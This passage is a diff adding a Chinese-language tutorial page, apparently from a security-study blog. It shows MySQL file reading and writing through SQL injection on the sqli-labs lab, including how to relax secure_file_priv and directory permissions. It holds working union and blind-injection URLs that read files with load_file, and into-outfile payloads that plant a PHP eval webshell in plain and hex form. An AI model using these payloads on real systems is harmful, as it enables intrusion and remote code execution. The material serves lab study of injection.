@@ -1,0 +1,69 @@
+<h1 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h1><h3 id="1-union-注入读取文件"><a href="#1-union-注入读取文件" class="headerlink" title="1. union 注入读取文件"></a>1. union 注入读取文件</h3><hr>
+<p><strong>注</strong>：当有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取；</p>
+<p>文件写入只能利用 union 注入</p>
+<p>示例：读取系统根目录下的&#x2F;demo.txt 文件</p>
+<pre><code class="language-bash">//union注入读取 /demo.txt 文件,windows使用-&gt;盘符:/路径
+
+http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,load_file(&quot;demo.txt&quot;) -- +
+
+//也可以把 /demo.txt 转换成16进制 这里没成功，可以去找找资料。。。
+
+http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,load_file(0x2F64656D6F2E747874) -- +
+</code></pre>
+<p>如果不成功，参考以下解决方案 在 mysql 目录中找到 my.ini&#x2F;my.cnf 文件在[mysqld]下面添加如下内容secure_file_priv &#x3D; “”如图：</p>
+<p>登录 mysql 执行以下命令</p>
+<pre><code class="language-bash">mysql&gt;SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;
+
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+</code></pre>
+<p>这里<code>secure_file_priv</code>​的值要为””或者 “&#x2F;“ secure_file_priv 有三个值</p>
+<p>1、限制 mysqld 不允许导入 | 导出</p>
+<p>​<code>mysqld –secure_file_prive=null</code>​</p>
+<p>2、限制 mysqld 的导入 | 导出 只能发生在&#x2F;tmp&#x2F;目录下</p>
+<p>​<code>mysqld –secure_file_priv=/tmp/</code>​</p>
+<p>3、不对 mysqld 的导入 | 导出做限制</p>
+<p>​<code>secure_file_priv=&#39;&#39;</code>​</p>
+<hr>
+<h3 id="2-盲注读取文件"><a href="#2-盲注读取文件" class="headerlink" title="2. 盲注读取文件"></a>2. 盲注读取文件</h3><hr>
+<p>盲注读取的话就是利用hex函数，将读取的字符串转换成 16 进制，再利用ascii函数，转换成 ascii 码，再利用二分法一个一个的判断字符，很复杂，一般结合工具完成</p>
+<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; and ascii(mid((select hex(load_file(&#39;e:/3.txt&#39;))),18,1))&gt;49#&#39; LIMIT 0,1</code>​</p>
+<p>我们可以利用写入文件的功能，在 e 盘创建 4.php 文件，然后写入一句话木马。</p>
+<pre><code class="language-bash">//利用union注入写入一句话木马 into outfile 和 into dumpfile 都可以
+http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,&#39;&lt;?php @eval($_POST[aaa]);?&gt;&#39; into outfile &#39;d:/4.php&#39; -- +
+
+// 可以将一句话木马转换成16进制的形式
+http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e into outfile &#39;d:/4.php&#39; -- +
+</code></pre>
+<p>在文件写入读取的时候，遇见以下这种情况。</p>
+<p><img src="/assets/image-20250519092519-0kcit26.png" alt="image"></p>
+<p>多半是因为权限不足，可以使用@@datadir，得到当前数据库存储目录，试着在数据库存储目录进行文件注入 比如</p>
+<p>​<code>http://192.168.209.128:88/Less-1/?id=-1&#39; union select 1,2,&#39;&lt;?php @eval($_POST[aaa]);?&gt;&#39; into outfile &#39;/www/server/mysql/4.php&#39; --</code>​</p>
+<p><img src="/assets/image-20250519092538-50xr08l.png" alt="image"></p>
+<p>注入成功</p>
+<p><strong>权限不足的解决办法-参考</strong>环境： CentOS7.0 64 位 MySQL5.7 问题：</p>
+<pre><code class="language-bash">#使用&#39;select into outfile&#39;备份数据表提示无法写入文件
+mysql&gt; select 1,2,&#39;you are very good hacker&#39; from  into outfile &#39;/www/server/mysql/app.txt&#39;;
+ERROR 1 (HY000): Can&#39;t create/write to file &#39;/www/server/mysql/app.txt&#39; (Errcode: 13)
+</code></pre>
+<p>排查：</p>
+<pre><code class="language-bash">#查看mysql的进程用户,为mysql用户
+[root@lfs ~]# ps aux|grep mysqld
+root       1400  0.0  0.1 108208  1612 ?        S    01:22   0:00 /bin/sh /usr/local/mysql/bin/mysqld_safe --user=mysql
+mysql      1778  0.0  6.6 974276 67076 ?        Sl   01:22   0:06 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/lfs.err --pid-file=/usr/local/mysql/data/lfs.pid --socket=/tmp/mysql.sock --port=3306
+
+#查看/www/server/mysql/目录的权限，mysql用户没有写入权限
+[root@lfs ~]# ls -ld /www/server/mysql/
+drwxr-xr-x 4 root root 4096 Aug 23 17:03 /www/server/mysql/
+</code></pre>
+<p>解决办法：</p>
+<pre><code class="language-bash">#将/data/mysql/目录的归属为mysql用户
+chown -R mysql.mysql /www/server/mysql/
+
+[root@lfs ~]# ls -ld /data/mysql/
+drwxr-xr-x 4 mysql mysql 4096 Aug 23 17:03 /www/server/mysql/
+</code></pre>
+<p>验证，写入成功：</p>
